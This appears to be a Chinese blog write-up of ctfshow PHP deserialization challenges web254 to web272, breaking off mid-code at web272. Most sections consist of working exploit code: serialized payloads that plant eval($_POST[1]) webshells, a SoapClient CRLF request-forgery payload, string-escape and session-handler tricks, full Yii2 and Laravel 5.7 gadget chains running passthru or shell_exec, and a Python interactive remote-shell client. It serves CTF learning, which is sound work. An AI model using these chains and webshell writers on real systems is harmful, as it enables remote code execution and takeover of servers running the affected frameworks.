---
title: Web入门_反序列化
author: Creexile
date: 2024-08-25 15:16:34
lastMod: 2025-08-29
summary: ''
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags:
  [
    RCE,
    PHP,
    隐写,
    PHP原生类,
    反序列化,
    PHP指针,
    Phar反序列化,
    Pickle反序列化,
    漏洞利用,
    session反序列化,
    字符逃逸,
    CTF,
  ]
---

# 反序列化

---

web254-278

## web254

- 描述: 开始反序列化

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @link: https://ctfer.com
*/
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

没有魔术方法也没有反序列化函数, 直接输入`ctfShowUser`函数定义的username和password即可通过isVIP判断

payload:

```
?username=xxxxxx&password=xxxxxx
```

## web255

- 描述: 同上

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @link: https://ctfer.com
*/
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

就算过了判断也没有将isVIP设定为true, 但是设置了cookie传值, 一样没有魔术方法

exp:

```php
<?php
    class ctfShowUser{
        public $username='xxxxxx';
        public $password='xxxxxx';
        public $isVip=true;
    }

    $a = new ctfShowUser();
    echo urlencode(serialize($a));
// O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

![image-20240823095722021](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240823095722021.png)

## web256

- 描述: 同上

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @link: https://ctfer.com
*/
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

在函数中判断password和username不能相等, 但是通过反序列化我们可以控制函数中的变量, 我们可以通过自定变量通过函数内的判断

exp:

```php
<?php
    class ctfShowUser{
        public $username='a';
        public $password='b';
        public $isVip=true;
    }

    $a = new ctfShowUser();
    echo urlencode(serialize($a));
```

payload:

```
GET:
?username=a&password=b
Cookie:
user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

## web257

- 描述: 同上

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @link: https://ctfer.com
*/
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }
}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}
```

似乎可以直接用backDoor执行命令, 甚至不需要登录成功, 存在即可

exp:

```php
<?php
    class ctfShowUser{
        public function __construct(){
            $this->class=new backDoor();
        }
    }

    class backDoor{
        private $code='eval($_POST[1]);';
        public function getInfo(){
            eval($this->code);
        }
    }

    $a = new ctfShowUser();
    echo urlencode(serialize($a));
```

传值一次后POST执行命令即可, 记得暂时关闭杀毒软件, 否则该php文件会被杀掉

![image-20240823103802592](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240823103802592.png)

## web258

- 描述: 同上

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @link: https://ctfer.com
*/
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}
class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}
```

这个正则表达式匹配以o或c(不区分大小写)开头, 紧接着是一个冒号, 然后是一个或多个数字, 最后又是一个冒号的字符串

怎么办呢, 增加一个加号在数字前面前面就行

> 本题的`$code`变成了public, 不要傻乎乎的拿着上题的exp只增加替换

```php
<?php
    class ctfShowUser{
        public function __construct(){
            $this->class=new backDoor();
        }
    }

    class backDoor{
        public $code='eval($_POST[1]);';
        public function getInfo(){
            eval($this->code);
        }
    }

    $a = serialize(new ctfShowUser());
    $b = str_replace(':11',':+11',$a);
    $c = str_replace(':8',':+8',$b);
    echo urlencode($c);
```

![image-20240823111634401](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240823111634401.png)

## web259

- 描述还挺多:

```php
//flag.php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);

if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
```

题目在这, 说是原生类反序列化

```php
<?php
highlight_file(__FILE__);

$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();
```

> 虽然`getFlag()`是未知的, 但是在php特性中, 如果调用一个未知的方法, 那么他会调用`__call()`魔术方法
>
> 本地测试需要在php拓展中打开soap拓展

[【靶场】ctfshow 详解web259原生类反序列化](https://blog.csdn.net/Yuppie001/article/details/139865505)

```php
<?php
$a = new SoapClient(null,array('uri'=>'bbb', 'location'=>'http://127.0.0.1:5555/path'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->not_exists_function();
// 测试下正常情况下的SoapClient类, 调用一个不存在的函数, 会去调用__call方法, 导致发包
// 监听5555端口即可抓到请求包内容
```

从服务器中获取`HTTP_X_FORWARDED_FOR`头部并分割为数组, 并移除最后一个元素两次, 这实际上将`$ip`设置为原始列表中倒数第二个IP地址

当ip为`127.0.0.1`并且满足token等于ctfshow时会将将`$flag`变量写入到flag.txt文件中

本地测试可以构造如下:

```php
<?php
$client = new SoapClient(null,array('uri' => 'http://127.0.0.1:9999/' , 'location' => 'http://127.0.0.1:9999/flag.php'));
$client->getFlag();
```

`uri`是命名空间URI, 它在SOAP消息中用于标识服务; URI通常不会指向实际的资源, 而是用来标识命名空间。
`location`是实际的服务端点URL, 即SOAP请求将发送到的服务器地址

![image-20240823163856099](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240823163856099.png)

我们可以控制的是UA头, 我们可以利用换行符顶替下面的包内容

payload:

```php
<?php
$ua = "ctfshow\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow";
$client = new SoapClient(null,array('uri' => 'http://127.0.0.1/' , 'location' => 'http://127.0.0.1/flag.php' , 'user_agent' => $ua));

echo urlencode(serialize($client));
// O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A131%3A%22ctfshow%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```

执行完后访问flag.txt即可

> 如果发现不行可能是复制序列化结果多复制了浏览器的换行符, 查看源代码后再复制即可

附录:

更改为本地测试可以得到包如下, 在读取完`Content-Length: 13`, 有效包到`token=ctfshow`就结束了

![image-20240823165742681](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240823165742681.png)

## web260

- 描述: 无

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
}
```

考的是字符串序列化后是自己本身, 那就直接提交这个字符串就可以了

## web261

- 描述: 打Redis?

```php
<?php

highlight_file(__FILE__);

class ctfshowvip{
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __wakeup(){
        if($this->username!='' || $this->password!=''){
            die('error');
        }
    }
    public function __invoke(){
        eval($this->code);
    }

    public function __sleep(){
        $this->username='';
        $this->password='';
    }
    public function __unserialize($data){
        $this->username=$data['username'];
        $this->password=$data['password'];
        $this->code = $this->username.$this->password;
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
}

unserialize($_GET['vip']);
```

1. 弱类型比较, 传入的code可以是877等
2. php版本为7.4.16, 存在 `__unserialize()`函数就不会再触发`__wakeup`
3. `__sleep`和`__invoke`触发似乎不太可能, 跳过, 只能用`__destruct`了
4. 可以利用`file_put_contents`写文件

既然是弱比较, 我的username是`877.php`不过分吧, 结合上面内容, 那就是利用`__destruct`里面的`file_put_contents`写马了

payload:

```php
<?php
    class ctfshowvip{
        public $username;
        public $password;
        public $code;

        public function __construct($u='',$p=''){
            $this->username='877.php';
            $this->password='<?php eval($_POST[1]);?>';
        }
    }
    echo urlencode(serialize(new ctfshowvip()));
// O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A4%3A%22code%22%3BN%3B%7D
```

然后访问877.php执行命令即可

## web262

- 描述: 无

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @message.php
# @link: https://ctfer.com
*/
error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}

highlight_file(__FILE__);
```

反序列化字符串逃逸, 还是字符增多的情况

> 我没做过, 觉得啰嗦就直接跳到下一题往上翻

注意题目注释里给的`message.php`:

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
*/
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_COOKIE['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```

### 非预期解

非预期是抓包直接传入修改过的cookie即可拿到flag

### 预期解

一步一步来, 首先构造未过滤和已过滤, 然后构造payload:

```php
<?php
    class message{
        public $from;
        public $msg;
        public $to;
        public $token='user';
        public function __construct($f,$m,$t){
            $this->from = $f;
            $this->msg = $m;
            $this->to = $t;
        }
    }

    function filter($msg){
        return str_replace('fuck', 'loveU', $msg);
    }

    $msg = new message('1','2','fuck');
    $ser = serialize($msg);
    echo $ser.'<br>';
    $fil = filter($ser);
    echo $fil.'<br>'.'<br>';
    /*
    未过滤 O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:4:"fuck";s:5:"token";s:4:"user";}
    有过滤 O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:4:"loveU";s:5:"token";s:4:"user";}
    成功逃逸了一个字符, 根据题目, 目标是将token设置为admin
    payload一共27个字符: ";s:5:"token";s:5:"admin";}
    所以需要替换27次全部逃逸出去
    */
    $msg1 = new message('1','2','fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}');
    $ser1 = serialize($msg1);
    $fil1 = filter($ser1);
    echo $fil1.'<br>'.'<br>';
    /*
    成功序列化, 尝试反序列化, 发现已经成功地将token值变为admin
    O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:135:"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU";s:5:"token";s:5:"admin";}";s:5:"token";s:4:"user";}
    */
    $obj = unserialize($fil1);
    var_dump($obj);
```

![image-20240823205205086](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240823205205086.png)

所以payload如下, 然后访问message.php得到flag

```
?f=1&m=2&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```

## web263

- 描述: 无

登录界面, 目录扫描后发现有备份文件泄露`www.zip`, 有用的文件`index.php`, 只取部分

> 源码写了: 密码必须为128位大小写字母+数字+特殊符号, 防止爆破

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @link: https://ctfer.com
*/
	error_reporting(0);
	session_start();
	//超过5次禁止登陆
	if(isset($_SESSION['limit'])){
		$_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
		$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
	}else{
		 setcookie("limit",base64_encode('1'));
		 $_SESSION['limit']= 1;
	}
?>
```

limit打错了, 登录失败限制不存在, 一定会执行后面内容, 等同于我们可以通过cookie控制session

再结合`check.php`中引入的`inc.php`文件中存在如下命令, 猜测默认使用的是php_serialize

```php
ini_set('session.serialize_handler', 'php');
```

那就是session反序列化漏洞, [深入浅析PHP的session反序列化漏洞问题](https://www.jb51.net/article/116246.htm)

而且在`inc.php`中还有可以用于写木马的函数:

```php
function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
```

所以利用路径大概如下:

构造的session->base64_decode->cookie序列化->反序列化->file_put_contents->log1.php

exp:

```php
<?php

session_start();

  class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function setStatus($s){
        $this->status=$s;
    }
  }

  $a = new User('1.php', '<?php eval($_POST[1])?>');

  /*
  不同的session的序列化引擎会有不同的结果, 利用解析不同造成反序列化漏洞
  user|0:4:"User":3:{s:8:"username";s:5:"1.php";s:8:"password";s:24:"<?php eval($_POST[1]); ?>";s:6:"status";N;
  a:1:{s:4:"user";0:4:"User":3:{s:8:"username";s:5:"1.php";s:8:"password";s:24:"<?php eval($_POST[1]); ?>";s:6:"status";N;}
  */

  echo base64_encode('|'.serialize($a));
?>
```

> 这里不能用hackbar改Cookie, 你得直接在Application里面更改, 好像发包有setcookie

写入cookie后发包, 然后访问`check.php`, 记得带上两个变量:

```
check.php?u=123&pass=123
```

访问`log-1.php`即可执行命令, 没成功就多重试几次

## web264

- 提示: message.php

```php
<?php
if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    $_SESSION['msg']=base64_encode($umsg);
    echo 'Your message has been sent';
}
// # 就拿有用的了
```

`message.php`如下:

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @link: https://ctfer.com
*/
session_start();
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_SESSION['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```

写入session是在替换后的, 似乎还可以用反序列化字符串逃逸, 基本和web262相同:

exp如下, payload就是message第三个参数

```php
<?php

session_start();

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

function filter($msg){
    return str_replace('fuck', 'loveU', $msg);
}

$msg = new message('1','2','fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}');
$ser = serialize($msg);
echo $ser.'<br>';

?>
```

payload:

```
?f=1&m=2&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```

访问`message,php`, 注意源码要求cookie存在msg参数, 随便填写一个就行

> 不要用hackbar传cookie, 会报错, 还是在控制台改

## web265

- 描述: 无

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @link: https://ctfer.com
*/
error_reporting(0);
include('flag.php');
highlight_file(__FILE__);
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$ctfshow = unserialize($_GET['ctfshow']);
$ctfshow->token=md5(mt_rand());

if($ctfshow->login()){
    echo $flag;
}
```

考的类似C的指针, 按照地址传参, 简单来说就是将把`&a`指向的地址传给了`&b`, a如果发生改变, b也随之变化

![image-20240824202717288](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240824202717288.png)

所以exp如下

```php
<?php

class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = &$this->token;
    }
}

$a = new ctfshowAdmin('1','2');
echo urlencode(serialize($a));

// O%3A12%3A%22ctfshowAdmin%22%3A2%3A%7Bs%3A5%3A%22token%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D
```

传入即可

## web266

- 描述: 无

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @link: https://ctfer.com
*/
highlight_file(__FILE__);

include('flag.php');
$cs = file_get_contents('php://input');

class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function login(){
        return $this->username===$this->password;
    }
    public function __toString(){
        return $this->username;
    }
    public function __destruct(){
        global $flag;
        echo $flag;
    }
}
$ctfshowo=@unserialize($cs);
if(preg_match('/ctfshow/', $cs)){
    throw new Exception("Error $ctfshowo",1);
}
```

只要能传入一个序列化的类就能触发`__destruct`, 但是被过滤了

大小写绕过即可, 或者破坏正常的反序列化结构但是保留正常类来得到flag

> 破坏结构虽然会报错(被正则匹配)但是依然会正常触发`__destruct`
>
> 记得用bp类工具, hackbar我测试不出来

```
O:7:"Ctfshow":2:{s:8:"username";s:1:"1";s:8:"password";s:1:"1";}
O:7:"ctfshow":2:{ctfshow}
```

## web267

- 描述: 无

题目只有登录没有注册, 利用Wappalyzer查看中间件, 发现web框架为Yii; 网上一搜就可以搜索到yii2框架有一个反序列化漏洞

在源码中可以找到yii.js, 发现正好是2.0版本, 现在只需要找到入口即可, [利用和解析](https://blog.csdn.net/byname1/article/details/137093252), [其他版本利用和解析](https://blog.csdn.net/cosmoslin/article/details/120612714)

尝试弱密码登录, 发现是admin:admin, 发现about界面换了, 查看源码可以发现新的注释: `<!--?view-source -->`

访问`/index.php?r=site%2Fabout&view-source`得到提示

```
///backdoor/shell
unserialize(base64_decode($_GET['code']))
```

访问`/index.php?r=backdoor/shell`, 提示没有code参数, 尝试传参`&code=1`, 返回空白, 这里肯定有界面, 那么界面有了, 开始利用反序列化链;

flag在根目录下

```php
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;
        public function __construct(){
            $this->checkAccess = 'passthru';
            $this->id = 'tac /flag';
        }
    }
}
namespace Faker{
    use yii\rest\CreateAction;
    class Generator{
        protected $formatters;
        public function __construct(){
            $this->formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}
namespace yii\db{
    use Faker\Generator;
    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
```

poc如下:

```

GET:
/index.php?r=backdoor/shell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19
```

再给一个大佬给的python脚本

```python
import requests, base64, time

def round(command: str, arg: str):
    url = "http://b491d895-d559-480c-9452-755528e4a4d7.challenge.ctf.show/"  # 以/结尾
    payload = b'O:32:"Codeception\\Extension\\RunProcess":1:{s:43:"\x00Codeception\\Extension\\RunProcess\x00processes";a:1:{i:0;O:20:"Faker\\ValidGenerator":3:{s:12:"\x00*\x00generator";O:22:"Faker\\DefaultGenerator":1:{s:10:"\x00*\x00default";s:arg_l:"arg";}s:12:"\x00*\x00validator";s:function_l:"function";s:13:"\x00*\x00maxRetries";i:1;}}}'
    payload = payload.replace(b"function_l", str(len(command)).encode())
    payload = payload.replace(b"function", command.encode())

    payload = payload.replace(b"arg_l", str(len(arg)).encode())
    payload = payload.replace(b"arg", arg.encode())
    params = {"r": "/backdoor/shell", "code": base64.b64encode(payload).decode()}
    while True:
        try:
            resp = requests.get(url+"index.php", params=params)
            break
        except:
            time.sleep(0.1)

    while True:
        try:
            resp = requests.get(url+"1")
            break
        except:
            time.sleep(0.1)

    return resp.text


if __name__ == '__main__':
    print("请输入命令...")
    while True:
        command = "shell_exec"
        arg = input(">>> ")
        if arg == "exit":
            break
        if arg == "":
            continue
        res = round(command, arg + " | tee 1")
        print(res[:-1])
```

还可以写shell:

> 所有的命令回显其实都可以DNS外带, 以后再来探索吧

```php
public function __construct(){
        $this->checkAccess = 'passthru';
        $this->id = "echo '<?php eval(\$_POST[1]);?>' > /var/www/html/basic/web/1.php";
}
```

## web268

- 描述: 换个姿势

换个链子就可以继续了

```php
<?php
namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('shell_exec', "echo '<?php eval(\$_POST[1]);?>' > /var/www/html/basic/web/1.php"); //此处写命令
    echo(base64_encode(serialize($exp)));
}
```

payload:

```
GET:
/index.php?r=backdoor/shell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czo2MzoiZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+JyA+IC92YXIvd3d3L2h0bWwvYmFzaWMvd2ViLzEucGhwIjt9aToxO3M6MzoicnVuIjt9fX0=
```

## web269-web270

- 描述: 还有姿势

```php
<?php
namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('shell_exec', 'cp /f* 1.txt'); //此处写命令
    echo(base64_encode(serialize($exp)));
}
```

payload如下, 然后再访问1.txt

```
GET:
/index.php?r=backdoor/shell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0=
```

## web271

- 描述: 举一反三

Laravel v5.7反序列化漏洞

POST请求发送data即可

```php
<?php
//gadgets.php
namespace Illuminate\Foundation\Testing{
	class PendingCommand{
		protected $command;
		protected $parameters;
		protected $app;
		public $test;
		public function __construct($command, $parameters,$class,$app)
	    {
	        $this->command = $command;
	        $this->parameters = $parameters;
	        $this->test=$class;
	        $this->app=$app;
	    }
	}
}
namespace Illuminate\Auth{
	class GenericUser{
		protected $attributes;
		public function __construct(array $attributes){
	        $this->attributes = $attributes;
	    }
	}
}
namespace Illuminate\Foundation{
	class Application{
		protected $hasBeenBootstrapped = false;
		protected $bindings;
		public function __construct($bind){
			$this->bindings=$bind;
		}
	}
}
namespace{
	echo urlencode(serialize(new Illuminate\Foundation\Testing\PendingCommand("system",array('tac /flag'),new Illuminate\Auth\GenericUser(array("expectedOutput"=>array("0"=>"1"),"expectedQuestions"=>array("0"=>"1"))),new Illuminate\Foundation\Application(array("Illuminate\Contracts\Console\Kernel"=>array("concrete"=>"Illuminate\Foundation\Application"))))));
}
?>
```

## web272

- 描述: 换个姿势

```php
<?php
namespace Illuminate\Broadcasting{

    use Illuminate\Bus\Dispatcher;
    use Illuminate\Foundation\Console\QueuedCommand;

    class PendingBroadcast
    {
        protected $events;
        protected $event;
